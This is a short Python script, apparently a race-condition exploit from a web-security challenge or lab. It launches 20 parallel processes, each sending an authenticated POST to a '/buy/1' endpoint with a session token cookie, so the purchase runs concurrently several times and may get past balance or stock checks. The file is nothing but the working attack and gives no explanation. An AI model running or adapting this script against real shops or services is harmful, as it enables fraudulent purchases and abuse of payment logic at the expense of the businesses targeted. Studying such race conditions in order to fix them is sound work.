from requests import post
from multiprocessing import *
import time
def f():
    post("http://host/buy/1", headers={
        "cookie": "token=[YOUR TOKEN]"
    })
for i in range(20):
    p = Process(target=f)
    p.start()
time.sleep(2)